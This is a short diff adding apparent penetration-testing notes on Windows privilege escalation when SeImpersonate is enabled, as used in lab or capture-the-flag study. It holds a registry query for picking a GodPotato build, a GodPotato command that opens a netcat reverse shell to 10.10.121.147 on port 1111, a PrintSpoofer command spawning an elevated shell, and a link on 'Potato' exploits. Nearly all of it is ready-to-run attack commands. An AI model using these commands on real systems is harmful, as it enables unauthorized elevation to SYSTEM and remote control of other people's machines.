@@ -1,0 +1,11 @@
+These two payloads are use to priv esc when SeImpersonate is allowed.
+To find out which version of Godpotato to run
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
+
+GodPotato
+.\GodPotato-NET4.exe -cmd "nc.exe -e cmd 10.10.121.147 1111"
+PrintSpoofer
+.\PrintSpoofer64.exe -i -c cmd
+
+More about Different Potatoes
+​https://jlajara.gitlab.io/Potatoes_Windows_Privesc
